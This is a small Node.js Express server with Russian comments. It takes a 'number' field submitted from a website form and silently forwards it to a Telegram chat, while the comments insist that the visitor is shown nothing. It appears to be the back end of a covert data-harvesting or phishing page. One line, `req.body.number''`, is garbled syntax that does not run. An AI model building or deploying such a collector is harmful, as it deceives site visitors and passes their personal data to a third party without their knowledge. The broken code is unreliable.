const express = require('express');
const bodyParser = require('body-parser');
const TelegramBot = require('node-telegram-bot-api');

const TOKEN = process.env.BOT_TOKEN;

const app = express();
const bot = new TelegramBot(TOKEN, { polling: true });

let CHAT_ID = null;

app.use(bodyParser.urlencoded({ extended: false }));
app.use(express.static('public'));

// Бот сам запоминает chat_id
bot.on('message', (msg) => {
  if (!CHAT_ID) {
    CHAT_ID = msg.chat.id;
  }
});

// Приём данных с сайта — ПОЛНАЯ ТИШИНА
app.post('/send', (req, res) => {
  const value = req.body.number'';

  if (CHAT_ID && value) {
    bot.sendMessage(CHAT_ID, value);
  }

  // НИЧЕГО не показываем пользователю
  res.redirect('/');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT);


